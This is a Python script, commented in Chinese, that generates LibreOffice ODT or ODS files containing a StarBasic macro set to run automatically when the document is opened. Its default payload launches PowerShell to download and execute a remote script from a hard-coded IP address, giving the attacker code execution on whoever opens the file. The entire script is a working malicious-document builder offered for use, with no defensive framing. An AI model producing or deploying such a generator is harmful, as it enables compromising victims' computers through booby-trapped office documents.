#!/usr/bin/env python3
"""
生成带有恶意宏的ODT/ODS文件
此脚本可直接生成包含自动执行宏的LibreOffice文档
无需安装LibreOffice
"""

import os
import zipfile
import io
import shutil
import argparse
from xml.etree import ElementTree as ET


def create_malicious_document(document_type, output_file, payload):
    """
    创建恶意LibreOffice文档
    
    参数:
    document_type: 文档类型 ('odt' 或 'ods')
    output_file: 输出文件路径
    payload: 恶意宏代码
    """
    # 创建临时工作目录
    temp_dir = "temp_doc"
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(temp_dir)
    
    # 创建必要的目录结构
    os.makedirs(os.path.join(temp_dir, "Basic", "Standard"), exist_ok=True)
    os.makedirs(os.path.join(temp_dir, "Configurations2", "accelerator"), exist_ok=True)
    os.makedirs(os.path.join(temp_dir, "Configurations2", "images", "Bitmaps"), exist_ok=True)
    os.makedirs(os.path.join(temp_dir, "Configurations2", "menubar"), exist_ok=True)
    os.makedirs(os.path.join(temp_dir, "Configurations2", "popupmenu"), exist_ok=True)
    os.makedirs(os.path.join(temp_dir, "Configurations2", "progressbar"), exist_ok=True)
    os.makedirs(os.path.join(temp_dir, "Configurations2", "statusbar"), exist_ok=True)
    os.makedirs(os.path.join(temp_dir, "Configurations2", "toolbar"), exist_ok=True)
    os.makedirs(os.path.join(temp_dir, "META-INF"), exist_ok=True)
    
    # 创建content.xml
    if document_type == "odt":
        content_xml = """<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xmlns:chart="urn:oasis:names:tc:opendocument:xmlns:chart:1.0" xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" xmlns:math="http://www.w3.org/1998/Math/MathML" xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:ooow="http://openoffice.org/2004/writer" xmlns:oooc="http://openoffice.org/2004/calc" xmlns:dom="http://www.w3.org/2001/xml-events" xmlns:xforms="http://www.w3.org/2002/xforms" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" office:version="1.2">
  <office:scripts>
    <office:event-listeners>
      <script:event-listener script:language="ooo:Basic" script:location="document" script:macro-name="Standard.Evil.Main" office:event-name="office:document-open"/>
    </office:event-listeners>
  </office:scripts>
  <office:body>
    <office:text>
      <text:p>This is a test document with macro.</text:p>
    </office:text>
  </office:body>
</office:document-content>"""
    else:  # ods
        content_xml = """<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xmlns:chart="urn:oasis:names:tc:opendocument:xmlns:chart:1.0" xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" xmlns:math="http://www.w3.org/1998/Math/MathML" xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:ooow="http://openoffice.org/2004/writer" xmlns:oooc="http://openoffice.org/2004/calc" xmlns:dom="http://www.w3.org/2001/xml-events" xmlns:xforms="http://www.w3.org/2002/xforms" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" office:version="1.2">
  <office:scripts>
    <office:event-listeners>
      <script:event-listener script:language="ooo:Basic" script:location="document" script:macro-name="Standard.Evil.Main" office:event-name="office:document-open"/>
    </office:event-listeners>
  </office:scripts>
  <office:body>
    <office:spreadsheet>
      <table:table table:name="Sheet1">
        <table:table-row>
          <table:table-cell office:value-type="string">
            <text:p>Test spreadsheet with macro</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
    </office:spreadsheet>
  </office:body>
</office:document-content>"""
    
    with open(os.path.join(temp_dir, "content.xml"), "w", encoding="utf-8") as f:
        f.write(content_xml)
    
    # 创建mimetype文件
    if document_type == "odt":
        mimetype = "application/vnd.oasis.opendocument.text"
    else:  # ods
        mimetype = "application/vnd.oasis.opendocument.spreadsheet"
    
    with open(os.path.join(temp_dir, "mimetype"), "w", encoding="utf-8") as f:
        f.write(mimetype)
    
    # 创建meta.xml
    meta_xml = """<?xml version="1.0" encoding="UTF-8"?>
<office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:ooo="http://openoffice.org/2004/office" office:version="1.2">
  <office:meta>
    <meta:creation-date>2023-01-01T00:00:00</meta:creation-date>
    <dc:date>2023-01-01T00:00:00</dc:date>
    <meta:editing-duration>PT00H00M00S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:generator>Python Script</meta:generator>
  </office:meta>
</office:document-meta>"""
    
    with open(os.path.join(temp_dir, "meta.xml"), "w", encoding="utf-8") as f:
        f.write(meta_xml)
    
    # 创建styles.xml
    styles_xml = """<?xml version="1.0" encoding="UTF-8"?>
<office:document-styles xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xmlns:chart="urn:oasis:names:tc:opendocument:xmlns:chart:1.0" xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" xmlns:math="http://www.w3.org/1998/Math/MathML" xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:ooow="http://openoffice.org/2004/writer" xmlns:oooc="http://openoffice.org/2004/calc" xmlns:dom="http://www.w3.org/2001/xml-events" office:version="1.2">
</office:document-styles>"""
    
    with open(os.path.join(temp_dir, "styles.xml"), "w", encoding="utf-8") as f:
        f.write(styles_xml)
    
    # 创建settings.xml
    settings_xml = """<?xml version="1.0" encoding="UTF-8"?>
<office:document-settings xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:config="urn:oasis:names:tc:opendocument:xmlns:config:1.0" xmlns:ooo="http://openoffice.org/2004/office" office:version="1.2">
</office:document-settings>"""
    
    with open(os.path.join(temp_dir, "settings.xml"), "w", encoding="utf-8") as f:
        f.write(settings_xml)
    
    # 创建manifest.xml
    manifest_xml = """<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">
 <manifest:file-entry manifest:media-type="application/vnd.oasis.opendocument.{}document-content.xml"/>
 <manifest:file-entry manifest:media-type="application/xml" manifest:full-path="meta.xml"/>
 <manifest:file-entry manifest:media-type="application/xml" manifest:full-path="settings.xml"/>
 <manifest:file-entry manifest:media-type="application/xml" manifest:full-path="styles.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="Basic/Standard/script-lb.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="Basic/Standard/Evil.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="Basic/script-lc.xml"/>
</manifest:manifest>""".format("text" if document_type == "odt" else "spreadsheet")
    
    with open(os.path.join(temp_dir, "META-INF", "manifest.xml"), "w", encoding="utf-8") as f:
        f.write(manifest_xml)
    
    # 创建宏相关文件
    script_lc_xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
 <library:library library:name="Standard" library:link="false"/>
</library:libraries>"""
    
    with open(os.path.join(temp_dir, "Basic", "script-lc.xml"), "w", encoding="utf-8") as f:
        f.write(script_lc_xml)
    
    script_lb_xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd">
<library:library xmlns:library="http://openoffice.org/2000/library" library:name="Standard" library:readonly="false" library:passwordprotected="false">
 <library:element library:name="Evil"/>
</library:library>"""
    
    with open(os.path.join(temp_dir, "Basic", "Standard", "script-lb.xml"), "w", encoding="utf-8") as f:
        f.write(script_lb_xml)
    
    # 创建恶意宏
    evil_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Evil" script:language="StarBasic" script:moduleType="normal">REM ***** BASIC *****

Sub Main
    {payload}
End Sub
</script:module>"""
    
    with open(os.path.join(temp_dir, "Basic", "Standard", "Evil.xml"), "w", encoding="utf-8") as f:
        f.write(evil_xml)
    
    # 创建ODT/ODS文件
    with zipfile.ZipFile(output_file, 'w') as zip_file:
        # 添加mimetype（必须是第一个且不压缩）
        zip_file.write(os.path.join(temp_dir, "mimetype"), "mimetype", zipfile.ZIP_STORED)
        
        # 添加其他文件
        for root, dirs, files in os.walk(temp_dir):
            for file in files:
                if file == "mimetype":
                    continue  # 已经添加过了
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, temp_dir)
                zip_file.write(file_path, arcname, zipfile.ZIP_DEFLATED)
    
    # 清理临时文件
    shutil.rmtree(temp_dir)
    print(f"成功创建恶意{document_type.upper()}文件: {output_file}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='生成带有恶意宏的LibreOffice文档')
    parser.add_argument('--type', choices=['odt', 'ods'], default='odt',
                      help='文档类型 (odt 或 ods)')
    parser.add_argument('--output', '-o', default='malicious.odt',
                      help='输出文件名')
    parser.add_argument('--payload', '-p', 
                      default='Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring(\'http://192.168.45.184/oneliner.ps1\')"""))',
                      help='要执行的恶意宏代码')
    
    args = parser.parse_args()
    
    # 如果用户指定了ods，但没有改变默认输出文件名，那么更新输出文件扩展名
    if args.type == 'ods' and args.output == 'malicious.odt':
        args.output = 'malicious.ods'
    
    create_malicious_document(args.type, args.output, args.payload)
